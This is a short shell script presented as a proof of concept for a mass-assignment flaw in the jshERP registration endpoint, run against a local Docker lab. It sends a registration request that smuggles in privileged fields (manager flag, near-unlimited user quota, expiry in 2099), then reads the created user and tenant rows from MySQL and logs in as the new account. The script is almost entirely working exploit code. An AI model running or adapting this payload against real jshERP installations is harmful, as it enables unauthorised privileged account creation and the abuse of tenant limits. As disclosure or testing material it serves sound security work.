#!/bin/sh
set -e
BASE='http://127.0.0.1:9999/jshERP-boot'
U="pocma$(date +%s)"
P='e10adc3949ba59abbe56e057f20f883e'
PAYLOAD=$(cat <<JSON
{"loginName":"$U","password":"$P","ismanager":1,"userNumLimit":9999999,"expireTime":"2099-12-31 23:59:59","remark":"poc-mass-assignment"}
JSON
)

echo "[PoC] register payload"
echo "$PAYLOAD"

echo "[Response] /user/registerUser"
docker exec jsherp33-app sh -lc "curl -s -X POST '$BASE/user/registerUser' -H 'Content-Type: application/json' -d '$PAYLOAD'"

echo "\n[DB] user row"
docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,login_name,ismanager,isystem,status,tenant_id FROM jsh_user WHERE login_name='$U';\""

echo "[DB] tenant row"
docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT tenant_id,login_name,user_num_limit,expire_time,remark FROM jsh_tenant WHERE login_name='$U';\""

echo "[Login Check]"
docker exec jsherp33-app sh -lc "curl -s -X POST '$BASE/user/login' -H 'Content-Type: application/json' -d '{\"loginName\":\"$U\",\"password\":\"$P\"}'"

echo "\n[Context] username=$U"
